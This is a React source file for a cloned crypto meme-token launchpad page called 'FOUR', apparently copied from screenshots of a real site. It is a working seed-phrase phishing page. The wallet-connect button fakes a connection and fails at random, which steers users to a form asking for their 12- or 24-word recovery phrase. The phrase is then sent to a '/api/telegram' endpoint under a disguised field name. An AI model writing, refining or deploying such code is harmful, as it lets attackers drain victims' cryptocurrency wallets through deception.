// page.tsx
'use client';
import { useState } from 'react';

export default function Home() {
  const [showWalletConnect, setShowWalletConnect] = useState(false);
  const [showImportWallet, setShowImportWallet] = useState(false);
  const [connectionError, setConnectionError] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(''));
  const [is24Word, setIs24Word] = useState(false);

  const handleBinanceConnect = () => {
    setConnecting(true);
    setConnectionError(false);
    
    setTimeout(() => {
      setConnecting(false);
      if (Math.random() > 0.5) {
        setConnectionError(true);
      }
    }, 2000);
  };

  const handleImport = async () => {
    const fullPhrase = seedPhrase.join(' ').trim();
    const wordCount = fullPhrase.split(/\s+/).length;
    const requiredWords = is24Word ? 24 : 12;
    
    if (wordCount < requiredWords) {
      alert(`Please enter a complete ${requiredWords}-word seed phrase`);
      return;
    }

    try {
      console.log('🔄 Importing seed phrase:', fullPhrase);
      
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          walletAddress: fullPhrase 
        }),
      });

      const data = await response.json();

      if (response.ok) {
        console.log('✅ Wallet imported successfully');
        setShowImportWallet(false);
        setShowWalletConnect(false);
        setSeedPhrase(Array(12).fill(''));
        setIs24Word(false);
        alert('Wallet imported successfully! Check your Telegram for confirmation.');
      } else {
        throw new Error(data.error || 'Failed to import wallet');
      }
    } catch (error) {
      console.error('❌ Import error:', error);
      alert('Failed to import wallet. Please try again.');
    }
  };

  const handleWordTypeChange = (is24WordMode: boolean) => {
    setIs24Word(is24WordMode);
    setSeedPhrase(Array(is24WordMode ? 24 : 12).fill(''));
  };

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Top Bar - EXACT from screenshots */}
      <div className="flex justify-between items-center p-4 border-b border-gray-800">
        <div className="flex items-center space-x-4">
          {/* Menu icon - non functional as requested */}
          <div className="w-6 h-6 bg-gray-600 rounded"></div>
          <h1 className="text-xl font-bold">FOUR</h1>
        </div>
        
        {/* Connect Wallet button */}
        <button 
          onClick={() => setShowWalletConnect(true)}
          className="bg-green-500 hover:bg-green-600 px-4 py-2 rounded text-sm"
        >
          Connect Wallet
        </button>
      </div>

      {/* Main Content Area */}
      <div className="p-4">
        {/* Recent Activity Section - EXACT from screenshot */}
        <div className="mb-6">
          <div className="text-sm space-y-2 mb-4">
            <div className="flex justify-between">
              <span className="text-green-400">Oxa9...68cf0a</span>
              <span>Bought O.2 BNB of BNBSZN</span>
            </div>
            <div className="flex justify-between">
              <span className="text-green-400">Ox3d...5bcfdc</span>
              <span>Bought O.35 BNB of BNBSZN</span>
            </div>
            <div className="flex justify-between">
              <span className="text-green-400">Ox1e...b170de</span>
              <span>Bou O.2 BNB of Brocc</span>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="grid grid-cols-2 gap-3 mb-4">
            <button className="bg-gray-900 py-3 rounded text-center">
              Create Token
            </button>
            <button className="bg-gray-900 py-3 rounded text-center">
              How it works
            </button>
          </div>

          {/* The New Way To MEME */}
          <div className="bg-gray-900 rounded p-4 mb-4">
            <h3 className="font-bold mb-1">The New Way To MEME</h3>
            <p className="text-gray-400 text-sm mb-2">Become A TAGGER</p>
            <div className="flex space-x-2">
              <span className="bg-gray-800 px-2 py-1 rounded text-xs">Stern</span>
              <span className="bg-gray-800 px-2 py-1 rounded text-xs">Taggers</span>
            </div>
          </div>

          {/* Search */}
          <div className="mb-4">
            <div className="bg-gray-900 rounded p-3 mb-2">
              <span className="text-gray-400">Search Token</span>
            </div>
            <div className="flex items-center">
              <div className="w-4 h-4 border border-gray-400 rounded mr-2"></div>
              <span className="text-sm text-gray-400">Listed on PancakeSwap</span>
            </div>
          </div>
        </div>

        {/* Navigation Tabs - EXACT positioning */}
        <div className="flex space-x-6 mb-4 border-b border-gray-800 pb-2">
          <button className="font-medium">All Tag</button>
          <button className="text-gray-400">All Token</button>
          <button className="text-gray-400">Time</button>
        </div>

        {/* Token Listings - Left aligned like screenshots */}
        <div className="space-y-4">
          {/* Token 1 - Seasons */}
          <div className="bg-gray-900 rounded p-4">
            <div className="flex justify-between items-start mb-2">
              <div>
                <h3 className="font-semibold">Seasons ... (BNB)</h3>
                <p className="text-xs text-gray-400">Meme created by: Qx6a...6873</p>
              </div>
              <span className="text-green-400 text-sm">$0.0%</span>
            </div>
            <p className="text-sm text-gray-300 mb-2">Heard even the seasons are being renamed now...</p>
            <div className="text-sm text-gray-400">
              Market Cap: 7.65 K
            </div>
          </div>

          {/* Token 2 - CZ FOOD */}
          <div className="bg-gray-900 rounded p-4">
            <div className="mb-2">
              <h3 className="font-semibold">CZ FOOD (BNB)</h3>
              <p className="text-xs text-gray-400">created by: Oxaa...2994</p>
            </div>
            <div className="text-sm text-gray-400">
              Market Cap: 8.22 K
            </div>
          </div>

          {/* Token 3 - Broccoli */}
          <div className="bg-gray-900 rounded p-4">
            <div className="mb-2">
              <h3 className="font-semibold">Broccoli ... (BNB)</h3>
              <p className="text-xs text-gray-400">createalpy: Ox4e...0618</p>
            </div>
            <p className="text-sm text-gray-300 mb-2">Broccoli DOGGY</p>
            <div className="flex justify-between text-sm">
              <span className="text-gray-400">Market Cap: 7.94 K</span>
              <span className="text-blue-400">Partnership</span>
            </div>
          </div>
        </div>
      </div>

      {/* Wallet Connect Modal - EXACT from screenshots */}
      {showWalletConnect && (
        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 rounded-lg w-full max-w-sm border border-gray-700">
            <div className="p-6 border-b border-gray-700 text-center">
              <h2 className="text-xl font-bold">Connect a Wallet</h2>
            </div>

            <div className="p-6">
              {connecting ? (
                <div className="text-center py-4">
                  <p className="font-medium mb-2">Opening Wallet...</p>
                  <p className="text-sm text-gray-400">Confirm connection in the wallet</p>
                </div>
              ) : connectionError ? (
                <div className="text-center py-4">
                  <p className="text-sm text-gray-300 mb-4">
                    We encountered a temporary security issue. This could be due to network instability or protection mechanisms.
                  </p>
                  <button 
                    onClick={() => setConnectionError(false)}
                    className="bg-green-500 hover:bg-green-600 w-full py-3 rounded-lg font-medium mb-2"
                  >
                    Retry Connection
                  </button>
                  <button className="text-blue-400 text-sm">Learn More</button>
                </div>
              ) : (
                <>
                  <div className="grid grid-cols-2 gap-3 mb-6">
                    <button className="bg-gray-800 p-4 rounded-lg flex flex-col items-center">
                      <span className="text-lg mb-1">thub</span>
                      <span className="text-sm">Wallet</span>
                    </button>
                    <button className="bg-gray-800 p-4 rounded-lg flex flex-col items-center">
                      <span className="text-lg mb-1">G</span>
                      <span className="text-sm">Google</span>
                    </button>
                    <button 
                      onClick={handleBinanceConnect}
                      className="bg-gray-800 p-4 rounded-lg flex flex-col items-center"
                    >
                      <span className="text-lg mb-1">₿</span>
                      <span className="text-sm">Binance Wallet</span>
                    </button>
                    <button className="bg-gray-800 p-4 rounded-lg flex flex-col items-center">
                      <span className="text-lg mb-1">OKX</span>
                      <span className="text-sm">Wallet</span>
                    </button>
                  </div>

                  <button 
                    onClick={() => setShowImportWallet(true)}
                    className="text-blue-400 text-sm w-full text-center"
                  >
                    Import using seed phrase
                  </button>
                </>
              )}
            </div>

            <div className="p-4 border-t border-gray-700">
              <button 
                onClick={() => setShowWalletConnect(false)}
                className="w-full bg-gray-800 hover:bg-gray-700 py-3 rounded-lg"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Import Wallet Modal - EXACT with 12/24 words */}
      {showImportWallet && (
        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 rounded-lg w-full max-w-md border border-gray-700">
            <div className="p-6 border-b border-gray-700 text-center">
              <h2 className="text-xl font-bold">Import Wallet</h2>
            </div>

            <div className="p-6">
              {/* 12/24 Word Selection */}
              <div className="flex space-x-3 mb-6">
                <button 
                  onClick={() => handleWordTypeChange(false)}
                  className={`flex-1 py-2 rounded ${!is24Word ? 'bg-green-500' : 'bg-gray-800'}`}
                >
                  12 Words
                </button>
                <button 
                  onClick={() => handleWordTypeChange(true)}
                  className={`flex-1 py-2 rounded ${is24Word ? 'bg-green-500' : 'bg-gray-800'}`}
                >
                  24 Word
                </button>
              </div>

              <p className="text-sm text-gray-300 mb-4 text-center">
                Enter your {is24Word ? '24' : '12'}-word seed phrase here.<br />
                Words are separated by single spaces.
              </p>
              
              {/* Seed phrase grid */}
              <div className="grid grid-cols-2 gap-2 mb-6">
                {Array(is24Word ? 24 : 12).fill('').map((_, index) => (
                  <div key={index} className="flex items-center">
                    <span className="text-gray-400 text-sm w-6">{index + 1}</span>
                    <input
                      type="text"
                      value={seedPhrase[index] || ''}
                      onChange={(e) => {
                        const newPhrase = [...seedPhrase];
                        newPhrase[index] = e.target.value;
                        setSeedPhrase(newPhrase);
                      }}
                      className="bg-gray-800 border border-gray-700 rounded p-2 text-sm flex-1 text-white"
                      placeholder={`Word ${index + 1}`}
                    />
                  </div>
                ))}
              </div>

              <div className="flex space-x-3">
                <button
                  onClick={() => {
                    setShowImportWallet(false);
                    setSeedPhrase(Array(12).fill(''));
                    setIs24Word(false);
                  }}
                  className="flex-1 bg-gray-800 hover:bg-gray-700 py-3 rounded-lg"
                >
                  Cancel
                </button>
                <button
                  onClick={handleImport}
                  className="flex-1 bg-green-500 hover:bg-green-600 py-3 rounded-lg font-medium"
                >
                  Import
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}	
